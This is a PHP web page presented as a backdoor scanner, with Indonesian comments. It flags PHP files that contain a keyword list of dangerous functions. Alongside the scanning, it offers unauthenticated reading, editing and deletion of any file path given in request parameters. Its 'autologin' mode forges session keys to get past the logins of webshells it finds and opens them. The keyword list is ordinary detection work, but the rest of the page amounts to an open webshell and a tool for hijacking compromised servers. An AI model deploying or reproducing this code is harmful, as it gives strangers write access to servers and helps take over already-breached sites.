<?php
@session_start();

// Default path lebih fleksibel
$default_path = is_dir($_SERVER['DOCUMENT_ROOT'] ?? '')
    ? rtrim($_SERVER['DOCUMENT_ROOT'], '/\\')
    : __DIR__; // fallback ke folder tempat script ini berada [web:198][web:203]

$path = $_GET['path'] ?? $default_path;
$view = $_GET['view'] ?? null;
$page = isset($_GET['page']) ? (int)$_GET['page'] : 1;
$per_page = 10;

/**
 * MODE: AUTOLOGIN (session bypass + redirect ke webshell)
 */
if (isset($_GET['action']) && $_GET['action'] === 'autologin' && !empty($_GET['target'])) {
    $targetFile = $_GET['target'];

    // Pastikan file ada
    if (file_exists($targetFile)) {

        // TODO: sesuaikan daftar session key dengan pola webshell yang sering kamu temui
        $sessionKeys = [
            'logged_in',
            'd5587b78418472a83b6a4b208c081080', // contoh key dari kasus kamu
        ];

        foreach ($sessionKeys as $k) {
            $_SESSION[$k] = true;
        }

        // Hitung URL webshell dari path file
        $relative = str_replace(rtrim($_SERVER['DOCUMENT_ROOT'], '/\\'), '', $targetFile);
        $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
        $url = $scheme . $_SERVER['HTTP_HOST'] . $relative;

        header('Location: ' . $url);
        exit;
    }

    echo 'Target file tidak ditemukan';
    exit;
}

// Fungsi scan backdoor (pattern sederhana)
function scanBackdoor($dir) {
    $patterns = [
        'eval', 'system', 'shell_exec', 'exec', 'passthru', 'base64_decode', 'assert',
        'str_rot13', 'gzinflate', 'gzuncompress', 'gzdecode', 'strrev', 'str_rot47'
    ]; // [web:183][web:188]

    $backdoors = [];
    if (!is_dir($dir)) {
        return $backdoors;
    }

    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
    foreach ($files as $file) {
        if ($file->isFile() && strtolower($file->getExtension()) === 'php') {
            $content = @file_get_contents($file->getPathname());
            if ($content === false) continue;
            foreach ($patterns as $pattern) {
                if (stripos($content, $pattern) !== false) {
                    $backdoors[] = $file->getPathname();
                    break;
                }
            }
        }
    }
    return $backdoors;
}

// Fungsi tampilkan isi file
function showFileContent($file) {
    if (file_exists($file)) {
        return htmlspecialchars(file_get_contents($file));
    }
    return '';
}

// Fungsi tampilkan URL preview
function showFileUrl($file) {
    $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\');
    $relative_path = str_replace($docRoot, '', $file);
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
    return $scheme . $_SERVER['HTTP_HOST'] . $relative_path; // [web:198][web:209]
}

// Fungsi pagination modern
function getPagination($total, $per_page, $current_page, $path) {
    $total_pages = max(1, ceil($total / $per_page));
    if ($total_pages <= 1) return '';

    $pagination = '';

    // First page
    $pagination .= "<a href='?path=" . urlencode($path) . "&page=1' class='btn btn-sm btn-outline-primary me-1'>⏮ First</a>";

    // Previous page
    if ($current_page > 1) {
        $pagination .= "<a href='?path=" . urlencode($path) . "&page=" . ($current_page - 1) . "' class='btn btn-sm btn-outline-primary me-1'>← Prev</a>";
    }

    // 5 tombol aktif di sekitar current page
    $start = max(1, $current_page - 2);
    $end = min($total_pages, $current_page + 2);

    for ($i = $start; $i <= $end; $i++) {
        $active = $i == $current_page ? 'btn-primary' : 'btn-outline-primary';
        $pagination .= "<a href='?path=" . urlencode($path) . "&page=$i' class='btn btn-sm $active me-1'>$i</a>";
    }

    // Next page
    if ($current_page < $total_pages) {
        $pagination .= "<a href='?path=" . urlencode($path) . "&page=" . ($current_page + 1) . "' class='btn btn-sm btn-outline-primary me-1'>Next →</a>";
    }

    // Last page
    $pagination .= "<a href='?path=" . urlencode($path) . "&page=$total_pages' class='btn btn-sm btn-outline-primary'>Last ⏭</a>";

    return $pagination;
}

// Edit file
if (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
    $file = $_POST['edit_file'];
    if (file_exists($file) && is_writable($file)) {
        if (file_put_contents($file, $_POST['file_content']) !== false) {
            echo "<div class='alert alert-success'>File berhasil disimpan!</div>";
        } else {
            echo "<div class='alert alert-danger'>Gagal menyimpan file!</div>";
        }
    } else {
        echo "<div class='alert alert-danger'>File tidak ditemukan atau tidak bisa diubah!</div>";
    }
}

// Delete file
if (isset($_POST['delete_file'])) {
    $file = $_POST['delete_file'];
    if (file_exists($file) && is_writable($file)) {
        if (unlink($file)) {
            echo "<div class='alert alert-success'>File berhasil dihapus!</div>";
            $view = null;
        } else {
            echo "<div class='alert alert-danger'>Gagal menghapus file!</div>";
        }
    } else {
        echo "<div class='alert alert-danger'>File tidak ditemukan atau tidak bisa dihapus!</div>";
    }
}

// Jalankan scan sekali saja per request, biar ga dobel-dobel
$backdoors = is_dir($path) ? scanBackdoor($path) : [];
$total_backdoors = count($backdoors);
$offset = ($page - 1) * $per_page;
$page_files = array_slice($backdoors, $offset, $per_page);
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scanner Backdoor Pro</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; font-family: 'Segoe UI', sans-serif; }
        .main-container { margin-top: 30px; }
        .card { border-radius: 15px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2); border: none; }
        .card:hover { transform: translateY(-5px); transition: all 0.3s ease; }
        .card-header { background: linear-gradient(45deg, #3498db, #2980b9); color: white; border-radius: 15px 15px 0 0 !important; }
        .btn-primary { background: linear-gradient(45deg, #3498db, #2980b9); border: none; }
        .btn-primary:hover { background: linear-gradient(45deg, #2980b9, #3498db); }
        .btn-success { background: linear-gradient(45deg, #27ae60, #229954); }
        .btn-success:hover { background: linear-gradient(45deg, #229954, #27ae60); }
        .btn-danger { background: linear-gradient(45deg, #e74c3c, #c0392b); }
        .btn-danger:hover { background: linear-gradient(45deg, #c0392b, #e74c3c); }
        .btn-warning { background: linear-gradient(45deg, #f1c40f, #f39c12); border: none; }
        .btn-warning:hover { background: linear-gradient(45deg, #f39c12, #f1c40f); }
        .list-group-item { cursor: pointer; font-size: 0.85em; border-left: 4px solid #3498db; transition: all 0.3s; }
        .list-group-item:hover { background-color: #f8f9fa; transform: translateX(5px); }
        #script-content { height: 350px; resize: none; font-family: 'Courier New', monospace; font-size: 11px; }
        .url-box {
            font-family: monospace;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            padding: 15px;
            border-radius: 10px;
            word-break: break-all;
            margin-bottom: 15px;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
        }
        .preview-btn { width: 100%; margin-bottom: 10px; border-radius: 25px; }
        .pagination-container { margin-top: 15px; padding: 15px; background: rgba(255,255,255,0.8); border-radius: 10px; }
        .stats { font-size: 0.9em; color: #666; }
        .alert { margin-bottom: 15px; }
    </style>
</head>
<body>
<div class="container-fluid main-container">
    <div class="row">
        <!-- Path Scanner -->
        <div class="col-md-3">
            <div class="card">
                <div class="card-header">
                    <h5 class="card-title mb-0"><i class="fas fa-folder-search me-2"></i>Path Scanner</h5>
                </div>
                <div class="card-body">
                    <form method="get">
                        <div class="mb-3">
                            <input type="text" class="form-control" name="path"
                                   value="<?= htmlspecialchars($path) ?>"
                                   placeholder="Contoh: /var/www/html atau /home/user/public_html">
                        </div>
                        <button type="submit" class="btn btn-primary w-100">
                            <i class="fas fa-search me-2"></i>Scan Sekarang
                        </button>
                    </form>
                </div>
            </div>
        </div>

        <!-- Hasil Scan -->
        <div class="col-md-3">
            <div class="card">
                <div class="card-header">
                    <h5 class="card-title mb-0"><i class="fas fa-exclamation-triangle me-2"></i>Hasil Scan</h5>
                </div>
                <div class="card-body">
                    <ul class="list-group" id="scan-results">
                        <?php if (is_dir($path)): ?>
                            <?php foreach ($page_files as $file): ?>
                                <?php $link = "?path=" . urlencode($path) . "&page=$page&view=" . urlencode($file); ?>
                                <li class="list-group-item">
                                    <a href="<?= $link ?>">
                                        <i class="fas fa-file-code me-2"></i><?= htmlspecialchars(basename($file)) ?>
                                    </a>
                                </li>
                            <?php endforeach; ?>
                        <?php else: ?>
                            <li class="list-group-item text-danger">
                                Path tidak valid atau tidak bisa diakses.
                            </li>
                        <?php endif; ?>
                    </ul>
                    <?php if (is_dir($path)): ?>
                        <div class="pagination-container">
                            <div class="text-center">
                                <?= getPagination($total_backdoors, $per_page, $page, $path) ?>
                                <div class="stats mt-2">
                                    Halaman <?= $page ?> dari <?= max(1, ceil($total_backdoors / $per_page)) ?>
                                    (<?= $total_backdoors ?> file terindikasi)
                                </div>
                            </div>
                        </div>
                    <?php endif; ?>
                </div>
            </div>
        </div>

        <!-- Edit & Delete + Auto Bypass -->
        <div class="col-md-6">
            <div class="card">
                <div class="card-header">
                    <h5 class="card-title mb-0"><i class="fas fa-edit me-2"></i>Edit & Delete File</h5>
                </div>
                <div class="card-body">
                    <?php if ($view): ?>
                        <div class="url-box">
                            <strong><i class="fas fa-link me-2"></i>URL Langsung:</strong><br>
                            <?= showFileUrl($view) ?>
                        </div>
                        <button onclick="openPreview()" class="btn btn-success preview-btn">
                            <i class="fas fa-external-link-alt me-2"></i>Buka di Tab Baru
                        </button>
                        <button onclick="copyUrl()" class="btn btn-secondary preview-btn">
                            <i class="fas fa-copy me-2"></i>Copy Link
                        </button>
                        <button onclick="autoLoginBypass()" class="btn btn-warning preview-btn">
                            <i class="fas fa-key me-2"></i>Buka (Session Bypass)
                        </button>
                        <hr>
                        <form method="post">
                            <input type="hidden" name="edit_file" value="<?= htmlspecialchars($view) ?>">
                            <textarea name="file_content" class="form-control" id="script-content" rows="15">
<?= showFileContent($view) ?></textarea>
                            <button type="submit" class="btn btn-success mt-2">
                                <i class="fas fa-save"></i> Simpan Perubahan
                            </button>
                        </form>
                        <form method="post" onsubmit="return confirm('Yakin ingin menghapus file ini?')">
                            <input type="hidden" name="delete_file" value="<?= htmlspecialchars($view) ?>">
                            <button type="submit" class="btn btn-danger mt-2">
                                <i class="fas fa-trash"></i> Hapus File
                            </button>
                        </form>
                    <?php else: ?>
                        <div class="text-center text-muted mt-4">
                            <i class="fas fa-eye-slash fa-3x mb-3"></i><br>
                            Pilih file dari kolom 2
                        </div>
                    <?php endif; ?>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    let currentUrl = '<?= $view ? showFileUrl($view) : '' ?>';
    let currentFilePath = '<?= $view ? addslashes($view) : '' ?>';

    function openPreview() {
        if (currentUrl) {
            window.open(currentUrl, '_blank');
        }
    }

    function copyUrl() {
        if (currentUrl) {
            navigator.clipboard.writeText(currentUrl).then(() => {
                alert('✅ URL berhasil dicopy!');
            }).catch(() => {
                alert('❌ Gagal copy URL');
            });
        }
    }

    function autoLoginBypass() {
        if (!currentFilePath) {
            alert('Tidak ada file terpilih.');
            return;
        }
        const url = '?action=autologin&target=' + encodeURIComponent(currentFilePath) +
                    '&path=' + encodeURIComponent('<?= htmlspecialchars($path) ?>') +
                    '&page=<?= (int)$page ?>';
        window.location.href = url;
    }
</script>
</body>
</html>
